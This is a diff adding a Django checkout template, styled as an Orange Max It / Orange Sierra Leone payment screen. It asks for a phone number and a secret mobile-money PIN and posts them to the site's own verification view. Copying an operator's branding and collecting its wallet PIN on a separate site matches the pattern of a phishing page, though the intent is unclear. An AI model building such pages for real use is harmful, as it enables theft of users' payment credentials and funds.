@@ -1,0 +1,62 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="max-w-md mx-auto bg-white min-h-[90vh] shadow-2xl rounded-[40px] overflow-hidden flex flex-col my-4">
+    
+    <div class="h-[35vh] relative">
+        <img src="https://images.unsplash.com/photo-1523908511403-7fc7b25592f4?w=800" 
+             class="w-full h-full object-cover" alt="Orange Lifestyle">
+        <div class="absolute bottom-0 left-0 w-full h-12 bg-white rounded-t-[40px]"></div>
+    </div>
+
+    <div class="px-8 flex-grow bg-white">
+        <h1 class="text-3xl font-black text-black mb-2">Authentication</h1>
+        <p class="text-[10px] text-gray-400 uppercase tracking-widest mb-8">Secured payment by Orange Max It</p>
+
+        <form action="{% url 'otp_verification' %}" method="POST" class="space-y-10">
+            {% csrf_token %}
+            
+            <div class="relative border-b-2 border-[#ff7900] pb-2">
+                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
+                    Enter your phone number <span class="text-red-500">*</span>
+                </label>
+                <div class="flex items-center gap-4">
+                    <div class="text-[#ff7900]">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" />
+                        </svg>
+                    </div>
+                    <input type="tel" name="payment_phone" required placeholder="+232" 
+                           class="w-full bg-transparent text-black text-lg outline-none font-semibold">
+                </div>
+            </div>
+
+            <div class="relative border-b-2 border-gray-200 pb-2 focus-within:border-[#ff7900] transition-colors">
+                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
+                    Secret PIN <span class="text-red-500">*</span>
+                </label>
+                <div class="flex items-center gap-4">
+                    <div class="text-gray-400">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
+                        </svg>
+                    </div>
+                    <input type="password" name="payment_pin" required maxlength="4" placeholder="••••" 
+                           class="w-full bg-transparent text-black text-lg outline-none tracking-[0.5em] font-bold">
+                </div>
+            </div>
+
+            <div class="pt-4">
+                <button type="submit" 
+                        class="w-full bg-[#ff7900] text-white font-bold py-4 rounded-xl shadow-lg hover:brightness-110 active:scale-[0.98] transition-all uppercase tracking-widest text-sm">
+                    Confirm & Pay SLE {{ order.total_amount }}
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <div class="p-8 text-center bg-white">
+        <p class="text-[8px] text-gray-300 uppercase tracking-[4px]">Powered by Orange Sierra Leone</p>
+    </div>
+</div>
+{% endblock %}
